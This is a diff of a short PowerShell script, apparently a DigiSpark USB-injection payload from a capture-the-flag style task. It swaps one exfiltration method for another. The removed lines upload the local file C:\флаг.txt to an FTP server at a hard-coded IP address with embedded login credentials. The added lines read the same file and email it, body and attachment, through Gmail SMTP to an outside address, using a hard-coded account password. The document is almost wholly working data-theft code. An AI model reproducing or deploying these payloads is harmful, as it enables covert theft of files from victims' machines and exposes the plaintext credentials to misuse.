@@ -1,11 +1,10 @@
-$File = ""C:\флаг.txt"";
-$ftp = "ftp://ih1562471:FmgLXptE2mUW@193.124.176.46";
-
-Write-Host -Object "ftp url: $ftp";
-
-$webclient = New-Object -TypeName System.Net.WebClient;
-$uri = New-Object -TypeName System.Uri -ArgumentList $ftp;
-
-Write-Host -Object "Uploading $File...";
-
-$webclient.UploadFile($uri, $File);
+$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); 
+$SMTPInfo.EnableSsl = $true; 
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('digisparkbot', 'FB7knT5wBVdWNx9'); 
+$ReportEmail = New-Object System.Net.Mail.MailMessage; 
+$ReportEmail.From = 'digisparkbot@gmail.com'; 
+$ReportEmail.To.Add('eniluxperx@gmail.com'); 
+$ReportEmail.Subject = 'DigiSpark Report'; 
+$ReportEmail.Body = type C:/флаг.txt; 
+$ReportEmail.Attachments.Add('флаг.txt'); 
+$SMTPInfo.Send($ReportEmail)\"
